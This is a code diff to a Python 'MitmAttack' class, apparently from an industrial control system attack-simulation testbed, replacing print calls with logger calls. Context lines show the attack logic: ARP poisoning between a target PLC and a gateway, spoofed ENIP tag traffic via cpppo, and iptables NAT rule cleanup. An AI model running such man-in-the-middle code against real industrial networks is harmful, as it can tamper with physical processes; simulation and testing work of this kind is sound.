@@ -52,7 +52,7 @@ class MitmAttack(SyncedAttack):
         for tag in request_tags:
             cmd.append(str(tag) + ':1=REAL')
 
-        print("MITM 💻:", "server:", cmd)
+        self.logger(f"MITM Attack server: {cmd}")
 
         self.server = subprocess.Popen(cmd, shell=False)
 
@@ -64,6 +64,8 @@ class MitmAttack(SyncedAttack):
         self.thread.start()
 
         launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
+        self.logger.debug(f"MITM Attack ARP Poison between {self.target_plc_ip} and "
+                          f"{self.intermediate_attack['gateway_ip']}")
 
     def receive_original_tags(self):
         request_tags = self.intermediate_plc['actuators'] + self.intermediate_plc['sensors']
@@ -92,7 +94,7 @@ class MitmAttack(SyncedAttack):
                 self.tags[request_tags[idx]] = float(value.decode())
 
         except Exception as error:
-            print('ERROR enip _receive: ', error)
+            self.logger.error(f"ERROR MITM Attack ENIP send_multiple: {error}")
 
     def update_tags_dict(self):
         # Acquire the lock
@@ -130,13 +132,13 @@ class MitmAttack(SyncedAttack):
     def cpppo_thread(self):
         while self.run_thread:
             cmd = self.make_client_cmd()
+            self.logger.debug(f"MITM Attack Client: {cmd}")
 
-            print("MITM 💻:", "client:", cmd)
             try:
                 client = subprocess.Popen(cmd, shell=False)
                 client.wait()
             except Exception as error:
-                print('ERROR enip _send multiple: ', error)
+                self.logger.error(f"ERROR MITM Attack client ENIP send_multiple: {error}")
             time.sleep(0.05)
 
     def interrupt(self):
@@ -145,6 +147,8 @@ class MitmAttack(SyncedAttack):
 
     def teardown(self):
         restore_arp(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
+        self.logger.debug(f"MITM Attack ARP Restore between {self.target_plc_ip} and "
+                          f"{self.intermediate_attack['gateway_ip']}")
 
         # Delete iptables rules
         os.system('iptables -t nat -D PREROUTING -p tcp -d ' + self.target_plc_ip +
